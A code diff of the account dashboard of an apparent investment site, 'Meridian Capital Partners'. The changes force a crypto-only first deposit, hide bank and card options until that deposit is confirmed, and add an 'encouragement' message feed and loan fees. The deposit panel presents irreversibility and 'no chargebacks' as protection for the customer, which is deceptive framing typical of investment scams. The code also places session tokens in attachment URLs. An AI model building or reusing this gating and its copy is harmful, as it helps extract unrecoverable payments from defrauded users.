@@ -7,6 +7,7 @@
   <title>My Account — Meridian Capital Partners</title>
   <meta name="description" content="Your Meridian Capital Partners investment dashboard — balances, deposits, withdrawals, transactions, loans and referrals." />
   <link rel="stylesheet" href="../assets/css/style.css" />
+  <link rel="stylesheet" href="../assets/css/dash.css" />
 <script src="https://sites.super.myninja.ai/_assets/ninja-daytona-script.js"></script>
 </head>
 <body>
@@ -71,6 +72,9 @@
             <div class="kv">
               <div class="row"><span>Account Number</span><span id="ovAcct">—</span></div>
               <div class="row"><span>Member ID</span><span id="ovMember">—</span></div>
+              <div class="row"><span>Routing / Sort Code</span><span id="ovSort">—</span></div>
+              <div class="row"><span>IBAN</span><span id="ovIban">—</span></div>
+              <div class="row"><span>BIC / SWIFT</span><span id="ovBic">—</span></div>
               <div class="row"><span>KYC Status</span><span id="ovKyc">—</span></div>
               <div class="row"><span>Account Status</span><span id="ovStatus">—</span></div>
             </div>
@@ -82,31 +86,74 @@
                 <tbody></tbody>
               </table>
             </div>
+            <hr style="border:none;border-top:1px dashed #e6ecf3;margin:24px 0;" />
+            <h3 style="font-family:var(--font-head);color:var(--brand-dark);margin-bottom:6px;">📢 Messages from Meridian</h3>
+            <p class="muted" style="margin-bottom:14px;">Announcements, offers and encouragement from the Meridian Capital Partners team.</p>
+            <div id="broadcastFeed" class="dash-grid" style="grid-template-columns:1fr;gap:14px;"></div>
           </div>
         </div>
 
         <!-- DEPOSIT -->
         <div class="tab-pane" id="tab-deposit">
           <div class="panel-body">
-            <p class="muted" style="margin-bottom:16px;">Fund your account via Faster Payments bank transfer, card, or crypto. Minimum first deposit is £100. Funds are credited within 1–2 business days.</p>
-            <div class="kv" style="margin-bottom:20px;">
-              <div class="row"><span>Account Holder</span><span id="depHolder">—</span></div>
-              <div class="row"><span>Sort Code</span><span id="depSort">—</span></div>
-              <div class="row"><span>Account Number</span><span id="depAcct">—</span></div>
-              <div class="row"><span>IBAN</span><span id="depIban">—</span></div>
-              <div class="row"><span>BIC</span><span id="depBic">—</span></div>
-              <div class="row"><span>Reference</span><span id="depRef">—</span></div>
+            <!-- Crypto-first security panel (shown until first deposit is confirmed) -->
+            <div id="cryptoFirstPanel" style="display:none;background:linear-gradient(135deg,#0a1f33,#123a5c);color:#e8eef5;border-radius:16px;padding:24px 26px;margin-bottom:22px;box-shadow:0 18px 44px rgba(10,31,51,.22);">
+              <div style="display:flex;align-items:center;gap:12px;margin-bottom:10px;">
+                <span style="font-size:30px;">🔐</span>
+                <div>
+                  <div style="font-family:var(--font-head);font-size:20px;font-weight:800;color:#fff;">Your first deposit is crypto-only</div>
+                  <div style="font-size:12.5px;color:#9db0c4;letter-spacing:.04em;text-transform:uppercase;">Why we start every account with cryptocurrency</div>
+                </div>
+              </div>
+              <p id="cryptoFirstReason" style="font-size:14.5px;line-height:1.7;color:#dbe6f1;margin:0 0 16px;"></p>
+              <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:12px;">
+                <div style="background:rgba(255,255,255,.06);border:1px solid rgba(201,162,39,.35);border-radius:10px;padding:12px 14px;">
+                  <div style="font-size:20px;">🚫</div><b style="color:#fff;">No chargebacks</b>
+                  <div style="font-size:12.5px;color:#9db0c4;">On-chain transfers are final and cannot be reversed by a third party.</div>
+                </div>
+                <div style="background:rgba(255,255,255,.06);border:1px solid rgba(201,162,39,.35);border-radius:10px;padding:12px 14px;">
+                  <div style="font-size:20px;">🛡️</div><b style="color:#fff;">No account hacking</b>
+                  <div style="font-size:12.5px;color:#9db0c4;">No card or bank credentials are ever exposed to fraudsters.</div>
+                </div>
+                <div style="background:rgba(255,255,255,.06);border:1px solid rgba(201,162,39,.35);border-radius:10px;padding:12px 14px;">
+                  <div style="font-size:20px;">🔒</div><b style="color:#fff;">No unauthorised debits</b>
+                  <div style="font-size:12.5px;color:#9db0c4;">Only you hold the private key — nobody can debit your funds.</div>
+                </div>
+              </div>
+              <div style="margin-top:16px;font-size:13px;color:#C9A227;font-weight:600;">✅ Once your first crypto deposit is confirmed, every other funding method unlocks automatically.</div>
             </div>
-            <h3 style="font-family:var(--font-head);color:var(--brand-dark);margin-bottom:12px;">Crypto Deposit Addresses</h3>
+
+            <!-- Unlocked banner (shown after first deposit) -->
+            <div id="cryptoUnlockedPanel" class="alert success" style="display:none;margin-bottom:20px;"></div>
+
+            <p class="muted" id="depIntro" style="margin-bottom:16px;">Fund your account via Faster Payments bank transfer, card, or crypto. Minimum first deposit is £100. Funds are credited within 1–2 business days.</p>
+
+            <!-- Bank details (hidden until first deposit confirmed) -->
+            <div id="bankDetailsBlock">
+              <div class="kv" style="margin-bottom:20px;">
+                <div class="row"><span>Account Holder</span><span id="depHolder">—</span></div>
+                <div class="row"><span>Sort Code</span><span id="depSort">—</span></div>
+                <div class="row"><span>Account Number</span><span id="depAcct">—</span></div>
+                <div class="row"><span>IBAN</span><span id="depIban">—</span></div>
+                <div class="row"><span>BIC</span><span id="depBic">—</span></div>
+                <div class="row"><span>Reference</span><span id="depRef">—</span></div>
+              </div>
+            </div>
+
+            <h3 style="font-family:var(--font-head);color:var(--brand-dark);margin-bottom:12px;">🪙 Crypto Deposit Addresses</h3>
             <div class="kv" id="cryptoWallets">
               <div class="row"><span>Loading wallets…</span><span>—</span></div>
             </div>
+            <hr style="border:none;border-top:1px dashed #e6ecf3;margin:20px 0;" />
+            <h3 id="depMethodsHeading" style="font-family:var(--font-head);color:var(--brand-dark);margin-bottom:6px;">All Deposit Options</h3>
+            <p class="muted" id="depMethodsSub" style="margin-bottom:14px;">Every funding option available to you. Choose the one that suits your country and follow the details shown.</p>
+            <div id="depositMethods" class="dash-grid" style="grid-template-columns:repeat(auto-fill,minmax(250px,1fr));margin-bottom:22px;"></div>
             <hr style="border:none;border-top:1px dashed #e6ecf3;margin:20px 0;" />
             <h3 style="font-family:var(--font-head);color:var(--brand-dark);margin-bottom:12px;">Submit Deposit Request</h3>
             <div class="form-row">
               <div class="form-group"><label>Amount (£)</label><input type="number" id="depAmount" placeholder="500" min="100" /></div>
               <div class="form-group"><label>Method</label>
-                <select id="depMethod"><option>Faster Payments</option><option>Debit / Credit Card</option><option>Bitcoin (BTC)</option><option>Ethereum (ETH)</option><option>Tether (USDT)</option></select>
+                <select id="depMethod"><option>Bitcoin (BTC)</option><option>Ethereum (ETH)</option><option>Tether (USDT)</option></select>
               </div>
             </div>
             <div class="form-group"><label>Transaction Reference / TxID (optional)</label><input type="text" id="depTxid" placeholder="e.g. bank ref or on-chain TxID" /></div>
@@ -162,7 +209,7 @@
             <h3 style="font-family:var(--font-head);color:var(--brand-dark);margin-bottom:12px;">My Loan Applications</h3>
             <div style="overflow-x:auto;">
               <table class="data" id="loanTable">
-                <thead><tr><th>Date</th><th>Product</th><th>Amount</th><th>Term</th><th>Status</th></tr></thead>
+                <thead><tr><th>Date</th><th>Product</th><th>Amount</th><th>Fee</th><th>Term</th><th>Status</th></tr></thead>
                 <tbody></tbody>
               </table>
             </div>
@@ -213,6 +260,11 @@
               <label>Your Message</label>
               <textarea id="supportMsg" rows="3" placeholder="Type your message to support…" style="width:100%;padding:10px 12px;border:1px solid #d7e0ea;border-radius:10px;font-family:inherit;font-size:14px;resize:vertical;"></textarea>
             </div>
+            <div class="form-group">
+              <label>Attach a photo (optional)</label>
+              <input type="file" id="supportFile" accept="image/*" onchange="previewSupportFile()" style="font-size:13px;" />
+              <div id="supportPreview" style="margin-top:8px;"></div>
+            </div>
             <button class="btn btn-gold" onclick="sendSupport()">Send Message</button>
             <div class="alert success" id="supportOk" style="margin-top:14px;"></div>
           </div>
@@ -256,9 +308,9 @@
 
   <script src="../assets/js/translations.js?v=3"></script>
   <script src="../assets/js/app.js?v=3"></script>
-  <script src="../assets/js/api.js?v=1"></script>
+  <script src="../assets/js/api.js?v=2"></script>
   <script>
-    var user = null, TX = [], LOANS = [], REF = null, WALLETS = [], PLANS = [], SUBS = [], MSGS = [];
+    var user = null, TX = [], LOANS = [], REF = null, WALLETS = [], PLANS = [], SUBS = [], MSGS = [], DEPOSITMETHODS = [], BROADCASTS = [], SITE = {};
 
     function sym() { return (user && user.symbol) || '£'; }
     function money(n) { return EV.util.fmtMoney(n, sym()); }
@@ -277,7 +329,7 @@
       EV.api.me().then(function (u) {
         if (u.role === 'admin') { location.href = '../admin/dashboard.html'; return; }
         user = u;
-        return Promise.all([EV.api.transactions(), EV.api.loans(), EV.api.referrals(), EV.api.wallets(), EV.api.plans(), EV.api.subscriptions(), EV.api.messages()]);
+        return Promise.all([EV.api.transactions(), EV.api.loans(), EV.api.referrals(), EV.api.wallets(), EV.api.plans(), EV.api.subscriptions(), EV.api.messages(), EV.api.depositMethods(), EV.api.broadcasts(), EV.api.site()]);
       }).then(function (res) {
         if (!res) return;
         TX = (res[0] && res[0].transactions) || [];
@@ -287,6 +339,9 @@
         PLANS = (res[4] && res[4].plans) || [];
         SUBS = (res[5] && res[5].subscriptions) || [];
         MSGS = (res[6] && res[6].messages) || [];
+        DEPOSITMETHODS = (res[7] && res[7].methods) || [];
+        BROADCASTS = (res[8] && res[8].broadcasts) || [];
+        SITE = res[9] || {};
         render();
       }).catch(function (ex) {
         if (ex && ex.status === 401) { EV.api.logout(); location.href = '../login.html'; return; }
@@ -312,6 +367,10 @@
 
       document.getElementById('ovAcct').textContent = user.accountNumber;
       document.getElementById('ovMember').textContent = user.memberId;
+      var _b = user.bank || {};
+      document.getElementById('ovSort').textContent = _b.sortCode || '—';
+      document.getElementById('ovIban').textContent = _b.iban || '—';
+      document.getElementById('ovBic').textContent = _b.bic || '—';
       document.getElementById('ovKyc').innerHTML = pill(user.kyc || 'pending');
       document.getElementById('ovStatus').innerHTML = pill(user.status || 'active');
 
@@ -358,6 +417,90 @@
       renderPlans();
       renderSubs();
       renderSupport();
+      renderDepositMethods();
+      renderBroadcasts();
+    }
+
+    /* ---------- DEPOSIT METHODS ---------- */
+    function isCryptoMethod(m) {
+      var t = ((m.name || '') + ' ' + (m.category || '') + ' ' + (m.details || '')).toLowerCase();
+      return /crypto|bitcoin|btc|ethereum|eth|usdt|usdc|tether|coin|on-chain|onchain|binance|solana|ripple|xrp|usd coin/.test(t);
+    }
+
+    function renderDepositMethods() {
+      var grid = document.getElementById('depositMethods');
+      if (!grid) return;
+      var firstDone = !!(user && user.firstDepositDone);
+      var cryptoFirst = !!(SITE && SITE.cryptoFirst);
+      var gated = cryptoFirst && !firstDone;
+
+      /* crypto-first panel */
+      var panel = document.getElementById('cryptoFirstPanel');
+      var unlocked = document.getElementById('cryptoUnlockedPanel');
+      var bankBlock = document.getElementById('bankDetailsBlock');
+      var intro = document.getElementById('depIntro');
+      var heading = document.getElementById('depMethodsHeading');
+      var sub = document.getElementById('depMethodsSub');
+      if (panel) panel.style.display = gated ? 'block' : 'none';
+      var reasonEl = document.getElementById('cryptoFirstReason');
+      if (reasonEl) reasonEl.textContent = (SITE && SITE.cryptoFirstReason) || 'For your first deposit we accept cryptocurrency only. Crypto deposits are settled on-chain, which means they cannot be reversed, charged back or debited without your private key — protecting you from the card fraud, account hacking and unauthorised debits that affect traditional bank and card payments. Once your first deposit is confirmed, every other funding method unlocks automatically.';
+      if (unlocked) {
+        if (cryptoFirst && firstDone) {
+          unlocked.style.display = 'block';
+          unlocked.innerHTML = '🔓 <b>All deposit methods unlocked.</b> Your first deposit is confirmed — bank transfer, card, wallets and every other funding method are now available below.';
+        } else { unlocked.style.display = 'none'; }
+      }
+      if (bankBlock) bankBlock.style.display = gated ? 'none' : 'block';
+      if (intro) intro.style.display = gated ? 'none' : 'block';
+      if (heading) heading.textContent = gated ? '🪙 Crypto Deposit Options' : 'All Deposit Options';
+      if (sub) sub.textContent = gated
+        ? 'Cryptocurrency is the only funding method available for your first deposit. Choose a network below and send your funds to the address shown.'
+        : 'Every funding option available to you. Choose the one that suits your country and follow the details shown.';
+
+      var list = DEPOSITMETHODS;
+      if (gated) list = DEPOSITMETHODS.filter(isCryptoMethod);
+      if (gated && !list.length) {
+        /* fall back to built-in crypto options if admin has none tagged */
+        list = [
+          { name: 'Bitcoin (BTC)', category: 'Cryptocurrency', icon: '₿', details: 'Send BTC to the address shown above.' },
+          { name: 'Ethereum (ETH)', category: 'Cryptocurrency', icon: 'Ξ', details: 'Send ETH to the address shown above.' },
+          { name: 'Tether (USDT)', category: 'Cryptocurrency', icon: '🪙', details: 'Send USDT (ERC-20 / TRC-20) to the address shown above.' }
+        ];
+      }
+
+      grid.innerHTML = list.map(function (m) {
+        return '<div class="dash-card" style="text-align:left;padding:18px;">' +
+          '<div style="font-size:24px;margin-bottom:4px;">' + esc(m.icon || '💳') + '</div>' +
+          '<div style="font-family:var(--font-head);color:var(--brand-dark);font-size:16px;font-weight:700;">' + esc(m.name) + '</div>' +
+          '<div class="mini" style="margin:2px 0 8px;">' + esc(m.category || '') + (m.min_amount ? ' · Min ' + money(m.min_amount) : '') + '</div>' +
+          (m.details ? '<div style="font-size:12.5px;color:var(--ink-soft);margin-bottom:6px;"><b>Details:</b> ' + esc(m.details) + '</div>' : '') +
+          (m.instructions ? '<div style="font-size:12.5px;color:var(--ink-soft);">' + esc(m.instructions) + '</div>' : '') +
+          '</div>';
+      }).join('') || '<div class="empty">No deposit methods configured yet.</div>';
+
+      var sel = document.getElementById('depMethod');
+      if (sel) {
+        var opts = gated ? list : DEPOSITMETHODS;
+        if (opts.length) sel.innerHTML = opts.map(function (m) { return '<option>' + esc(m.name) + '</option>'; }).join('');
+      }
+    }
+
+    /* ---------- BROADCASTS ---------- */
+    function renderBroadcasts() {
+      var feed = document.getElementById('broadcastFeed');
+      if (!feed) return;
+      if (!BROADCASTS.length) {
+        feed.innerHTML = '<div class="empty">No announcements yet. Check back soon.</div>';
+        return;
+      }
+      feed.innerHTML = BROADCASTS.map(function (b) {
+        return '<div class="dash-card" style="text-align:left;padding:18px 20px;border-left:4px solid #C9A227;">' +
+          '<div style="display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap;align-items:baseline;">' +
+          '<div style="font-family:var(--font-head);color:var(--brand-dark);font-size:16px;font-weight:700;">📢 ' + esc(b.subject) + '</div>' +
+          '<div class="mini">' + EV.util.fmtDate(b.created_at) + '</div></div>' +
+          '<div style="font-size:13.5px;color:var(--ink-soft);margin-top:8px;line-height:1.65;">' + esc(b.body).replace(/\n/g, '<br/>') + '</div>' +
+          '</div>';
+      }).join('');
     }
 
     /* ---------- INVESTMENT PLANS ---------- */
@@ -407,13 +550,37 @@
       if (!el) return;
       el.innerHTML = MSGS.map(function (m) {
         var mine = m.sender === 'user';
+        var att = '';
+        if (m.has_attachment) {
+          var url = '/api/messages/' + m.id + '/attachment?token=' + encodeURIComponent(EV.api.token());
+          att = '<div style="margin-top:8px;"><a href="' + url + '" target="_blank">' +
+            '<img src="' + url + '" alt="attachment" style="max-width:200px;max-height:200px;border-radius:8px;display:block;" /></a></div>';
+        }
         return '<div style="display:flex;justify-content:' + (mine ? 'flex-end' : 'flex-start') + ';margin-bottom:10px;">' +
           '<div style="max-width:75%;padding:10px 14px;border-radius:12px;font-size:13.5px;line-height:1.5;' +
           (mine ? 'background:#0E4C92;color:#fff;border-bottom-right-radius:3px;' : 'background:#eef3f9;color:#0A1F33;border-bottom-left-radius:3px;') + '">' +
-          esc(m.body) + '<div style="font-size:10.5px;opacity:.7;margin-top:5px;">' + (mine ? 'You' : 'Support') + ' · ' + EV.util.fmtDateTime(m.created_at) + '</div>' +
+          (m.body ? esc(m.body) : '') + att +
+          '<div style="font-size:10.5px;opacity:.7;margin-top:5px;">' + (mine ? 'You' : 'Support') + ' · ' + EV.util.fmtDateTime(m.created_at) + '</div>' +
           '</div></div>';
       }).join('') || '<div class="empty" style="text-align:center;padding:20px;">No messages yet. Start the conversation below.</div>';
       el.scrollTop = el.scrollHeight;
+    }
+
+    var SUPPORT_ATTACH = null;
+    function previewSupportFile() {
+      var f = document.getElementById('supportFile').files[0];
+      var box = document.getElementById('supportPreview');
+      SUPPORT_ATTACH = null;
+      if (!f) { box.innerHTML = ''; return; }
+      if (!/^image\//.test(f.type)) { box.innerHTML = '<span style="color:#c0392b;font-size:12.5px;">Only image files are allowed.</span>'; return; }
+      if (f.size > 3 * 1024 * 1024) { box.innerHTML = '<span style="color:#c0392b;font-size:12.5px;">Image must be under 3MB.</span>'; return; }
+      var reader = new FileReader();
+      reader.onload = function () {
+        SUPPORT_ATTACH = { data: reader.result, name: f.name, type: f.type };
+        box.innerHTML = '<img src="' + reader.result + '" style="max-width:140px;max-height:140px;border-radius:8px;border:1px solid #e6ecf3;" />' +
+          '<div class="mini" style="margin-top:4px;">' + esc(f.name) + '</div>';
+      };
+      reader.readAsDataURL(f);
     }
 
     function sendSupport() {
@@ -421,9 +588,12 @@
       var ok = document.getElementById('supportOk');
       ok.classList.remove('show');
       var body = el.value.trim();
-      if (!body) { ok.className = 'alert error show'; ok.textContent = 'Type a message first.'; return; }
-      EV.api.sendMessage(body).then(function () {
+      if (!body && !SUPPORT_ATTACH) { ok.className = 'alert error show'; ok.textContent = 'Type a message or attach a photo first.'; return; }
+      EV.api.sendMessage(body, SUPPORT_ATTACH).then(function () {
         el.value = '';
+        document.getElementById('supportFile').value = '';
+        document.getElementById('supportPreview').innerHTML = '';
+        SUPPORT_ATTACH = null;
         ok.className = 'alert success show'; ok.textContent = 'Message sent to support.';
         load();
       }).catch(function (ex) { ok.className = 'alert error show'; ok.textContent = (ex && ex.message) || 'Could not send.'; });
@@ -432,19 +602,23 @@
     function renderTx() {
       var rows = TX.map(function (t) {
         var canCancel = (t.status === 'pending' && (t.type === 'withdrawal' || t.type === 'deposit'));
-        var actions = '<a href="receipt.html?id=' + t.id + '">View</a>' +
-          (canCancel ? ' <button class="btn btn-outline-dark btn-xs" onclick="cancelTx(\'' + t.id + '\')">Cancel</button>' : '');
-        return '<tr><td>' + EV.util.fmtDate(t.created_at) + '</td><td>' + esc(t.type) + '</td><td>' + esc(t.note || t.method || '') + '</td>' +
+        var actions = '<a href="receipt.html?id=' + t.id + '" class="btn btn-outline-dark btn-xs">🧾 Receipt</a>' +
+          (canCancel ? ' <button class="btn btn-outline-dark btn-xs" onclick="event.stopPropagation();cancelTx(\'' + t.id + '\')">Cancel</button>' : '');
+        return '<tr class="tx-row" style="cursor:pointer;" onclick="openReceipt(\'' + t.id + '\')">' +
+          '<td>' + EV.util.fmtDate(t.created_at) + '</td><td>' + esc(t.type) + '</td><td>' + esc(t.note || t.method || '') + '</td>' +
           '<td>' + money(t.amount) + '</td><td>' + pill(t.status) + '</td>' +
           '<td>' + actions + '</td></tr>';
       }).join('');
       document.getElementById('allTx').querySelector('tbody').innerHTML = rows || '<tr><td colspan="6" class="empty">No transactions yet.</td></tr>';
       var recent = TX.slice(0, 5).map(function (t) {
-        return '<tr><td>' + EV.util.fmtDate(t.created_at) + '</td><td>' + esc(t.type) + '</td><td>' + esc(t.note || t.method || '') + '</td>' +
+        return '<tr class="tx-row" style="cursor:pointer;" onclick="openReceipt(\'' + t.id + '\')">' +
+          '<td>' + EV.util.fmtDate(t.created_at) + '</td><td>' + esc(t.type) + '</td><td>' + esc(t.note || t.method || '') + '</td>' +
           '<td>' + money(t.amount) + '</td><td>' + pill(t.status) + '</td></tr>';
       }).join('');
       document.getElementById('recentTx').querySelector('tbody').innerHTML = recent || '<tr><td colspan="5" class="empty">No transactions yet.</td></tr>';
     }
+
+    function openReceipt(id) { location.href = 'receipt.html?id=' + id; }
 
     function cancelTx(id) {
       if (!confirm('Cancel this request? If it is a withdrawal, the held amount will be returned to your balance.')) return;
@@ -457,9 +631,10 @@
     function renderLoans() {
       var rows = LOANS.map(function (l) {
         return '<tr><td>' + EV.util.fmtDate(l.created_at) + '</td><td>' + esc(l.product) + '</td><td>' + money(l.amount) + '</td>' +
+          '<td>' + (l.fee ? money(l.fee) : '—') + '</td>' +
           '<td>' + l.term + ' mo</td><td>' + pill(l.status) + '</td></tr>';
       }).join('');
-      document.getElementById('loanTable').querySelector('tbody').innerHTML = rows || '<tr><td colspan="5" class="empty">No loan applications yet.</td></tr>';
+      document.getElementById('loanTable').querySelector('tbody').innerHTML = rows || '<tr><td colspan="6" class="empty">No loan applications yet.</td></tr>';
     }
 
     function submitDeposit() {
@@ -555,6 +730,6 @@
 
     load();
   </script>
-<script src="../assets/js/site.js?v=1"></script>
+<script src="../assets/js/site.js?v=2"></script>
 </body>
 </html>
